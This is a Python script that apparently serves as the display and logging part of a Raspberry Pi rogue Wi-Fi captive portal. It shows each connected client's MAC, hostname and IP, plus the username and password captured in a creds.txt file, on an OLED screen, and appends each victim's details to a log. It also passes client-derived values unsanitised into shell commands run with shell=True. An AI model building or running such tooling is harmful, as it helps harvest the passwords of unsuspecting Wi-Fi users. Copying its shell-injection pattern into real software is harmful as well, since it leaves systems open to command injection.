#!/usr/bin/env python

"""
stats.py - Display Captive Portal status info on OLED screen

Version 1.0 2019.04.12 - r.grokett initial

License: GPLv3, see: www.gnu.org/licenses/gpl-3.0.html

""" 

import os, sys
import subprocess
import time 
import signal
import json
from datetime import datetime


from luma.core.interface.serial import i2c
from luma.core.render import canvas
from luma.oled.device import sh1106
from PIL import ImageFont, Image 

# USER EDITABLE
DEBUG = 0   # 0/1 = off/on 

# I2C interface and address
serial = i2c(port=1, address=0x3C)
# OLED Device
device = sh1106(serial)


if DEBUG:
    print( "DEBUG: ON" ) 

# Display Defaults
blink = 1
ch = [' ','scanning']
line1 = ""
line2 = ""
line3 = ""
line4 = ""
line5 = ""

# Use custom font
font_path = "/usr/local/etc/fonts/C&C Red Alert [INET].ttf"
font2 = ImageFont.truetype(font_path, 12) 

# Collected data log file
outfile = "/var/www/html/data.txt"

##################
# Functions
##################

# BLINK
def get_BLINK(blink):
    if DEBUG:
      print ("get_BLINK()") 
    return(not blink) 

# DATE/TIME
def get_DATE():
    cur_date = datetime.now().strftime('%Y-%m-%d %H:%M:%S') 
    return(cur_date)

# SSID
def get_SSID():
    if DEBUG:
      print ("get_SSID()") 
    cmd = '/sbin/iw dev wlan0 info|grep ssid|cut -d" " -f2-'
    returned_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
    returned_output = returned_output[:-1]
    return(returned_output.decode("utf-8"))

# CLIENT MAC 
def get_MAC():
    if DEBUG:
      print ("get_MAC()") 
    cmd = '/sbin/iw dev wlan0 station dump|grep Station|head -1|cut -d" "  -f2'
    returned_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
    returned_output = returned_output[:-1]
    return(returned_output.decode("utf-8"))

# CLIENT NAME
def get_NAME(mac):
    if DEBUG:
      print(("get_NAME("+str(mac)+")")) 
    if (mac == ""):
      mac = "NONE"
    cmd = "grep -m1 "+str(mac)+" /var/lib/misc/dnsmasq.leases |cut -d' ' -f4"
    returned_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
    returned_output = returned_output[:-1]
    return(returned_output.decode("utf-8"))

# CLIENT IP
def get_IP(mac):
    if DEBUG:
      print(("get_IP("+str(mac)+")")) 
    if (mac == ""):
      mac = "NONE"
    cmd = "grep -m1 "+str(mac)+" /var/lib/misc/dnsmasq.leases |cut -d' ' -f3"
    returned_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
    returned_output = returned_output[:-1]
    return(returned_output.decode("utf-8"))

# USER CREDS
def get_USER(ip):
    if DEBUG:
      print(("get_USER("+str(ip)+")")) 
    if (ip == ""):
      ip = "NONE"
    cmd = "tail -1 /var/www/html/creds.txt|grep "+str(ip)+"|cut -d'|' -f3"
    returned_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
    returned_output = returned_output[:-1]
    return(returned_output.decode("utf-8"))

# WRITE TO FILE
def write_file(outfile, data):
    if DEBUG:
      print("write_file()"+str(outfile))
    f = open(outfile,'a')
    f.write(json.dumps(data))
    f.close()



def exit_gracefully(signum, frame):
    with canvas(device) as draw:
      draw.rectangle(device.bounding_box, outline="white", fill="black")
    quit()


##################
# Main
##################

signal.signal(signal.SIGINT, exit_gracefully)
signal.signal(signal.SIGTERM, exit_gracefully)

arr_data = []     # List
d_data = {        # Dict
    "date": '',
    "mac" : '',
    "name": '',
    "user": ''
    }
arr_data.append(dict(d_data))

cnt = 0           # New MACs count since last reboot

while 1:
    # SCREEN
    with canvas(device) as draw:
      draw.rectangle(device.bounding_box, outline="white", fill="black")
      draw.text((5,5), line1, font=font2, fill="white")
      draw.text((5,15), line2, font=font2, fill="white")
      draw.text((5,25), line3, font=font2, fill="white")
      draw.text((5,35), line4, font=font2, fill="white")
      draw.text((5,45), line5, font=font2, fill="white") 

    blink = get_BLINK(blink)
    line1 = "RaspiPortal  "+str(ch[blink]) 

    ssid  = get_SSID()
    line2 = "SSID: "+str(ssid)
    line2 = line2[:22]

    mac   = get_MAC()
    line3 = "MAC: "+str(mac)
    line3 = line3[:22]

    name  = get_NAME(mac)
    line4 = "NAME: "+str(name)
    line4 = line4[:22]

    ip    = get_IP(mac)
    user  = get_USER(ip)
    line5 = "ID/PW: "+str(user)
    line5 = line5[:22]

    # Store any new MACs seen
    if not any(d['mac'] == mac for d in arr_data):
          dt = get_DATE() 
          d_data.update({   
            "date": dt,
            "mac" : mac,
            "name": name,
            "user": user 
          })
          arr_data.append(dict(d_data))
          cnt = cnt + 1
          write_file(outfile, d_data)

    if blink == 0:
      line1 = "RaspiPortal  "+str(cnt) 

    if DEBUG :
      print ('Loop...') 
 
    time.sleep(1)

